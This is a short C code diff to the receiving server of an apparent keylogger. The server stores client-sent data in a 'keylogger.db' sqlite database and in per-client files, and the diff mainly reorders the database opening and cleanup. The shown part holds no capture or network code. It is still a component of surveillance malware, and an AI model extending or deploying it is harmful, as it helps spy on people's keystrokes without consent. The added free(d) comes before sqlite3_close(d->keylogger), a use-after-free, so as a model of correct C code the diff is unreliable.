@@ -131,7 +131,6 @@ void server(struct sockaddr_in *addr, struct data *d) {
 	  if(research_data(d->keylogger, d->num_client) == 0)
 	    create_data(d->keylogger, 1, d->num_client, tmp);
 
-	  printf("tmp before fopen: %s\n", tmp);
 	  file= fopen(tmp, "a");
 	  if(file == NULL)
 	    err(1, "Pb with fopen dataSent_byClient");
@@ -170,13 +169,14 @@ void sigint_handler(int sig) {
 int main () { 
   struct data *d= calloc(1, sizeof(struct data));
   pthread_t thread_window;
+
+  int res= sqlite3_open("../database/keylogger.db", &d->keylogger);
   
   if(pthread_create(&thread_window, NULL, mainWindow, (void *)d) == -1) {
     perror("pthread create error\n");
     return EXIT_FAILURE;
   }
 
-  int res= sqlite3_open("../database/keylogger.db", &d->keylogger);
   if(res) {
     perror("can't succeed\n");
     exit(0);
@@ -188,12 +188,12 @@ int main () {
   signal(SIGINT, sigint_handler);
   server(addr, d);
   free(addr);
+  free(d);
   sqlite3_close(d->keylogger);
 
   if(pthread_join(thread_window, NULL)) {
     perror("pthread_join error\n");
     return EXIT_FAILURE;
   }
-
   return 0;
 }
